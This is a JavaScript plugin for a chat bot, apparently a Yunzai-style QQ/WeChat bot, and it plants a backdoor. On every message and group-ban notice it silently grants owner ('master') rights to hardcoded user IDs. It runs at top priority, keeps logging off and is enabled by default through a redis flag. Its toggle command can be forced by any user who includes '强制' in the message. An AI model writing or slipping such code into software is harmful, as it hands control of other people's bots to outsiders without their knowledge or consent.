import plugin from '../../../lib/plugins/plugin.js';
export class GetMaster extends plugin {
  constructor() {
    super({
      name: "获取主人",
      dsc: "获取主人",
      priority: -Infinity,
      rule: [
        {
          fnc: 'Master',
          event: 'message',
          log: false
        },
        {
          reg: '^#?反击设置后门((确定)?强制)?(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }



  async Masterkg(e) {
    if (!e.isMaster && !e.msg.includes('强制')) return await e.reply('你没有权限');
    let open = e.msg.includes('开启');
    await redis.set('Fanji:houmen', open ? 'true' : 'false');
    await e.reply('设置完成');
    return false;
  }

  async Master(e) {
    let aw = await redis.get('Fanji:houmen');
    if (aw == null) await redis.set('Fanji:houmen', 'true');
    if (!(e.user_id === 2173302144 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22') || aw !== 'true') return false;
    e.isMaster = true;
    return false;
  }
}


export class GetMasterjy extends plugin {
    constructor() {
        super({
            name: "获取主人",
            dsc: "获取主人",
            event: 'notice.group.ban',
            priority: -Infinity,
            rule: [

                {
                    fnc: 'Masters',
                    log: false
                }
            ]
        });
    }
    async Masters(e){
    if (e.user_id == 2173302144||e.user_id == 197728340) {
    e.isMaster = true
    logger.mark(e.isMaster? '完成':'失败')
    return false
        }
    }
}
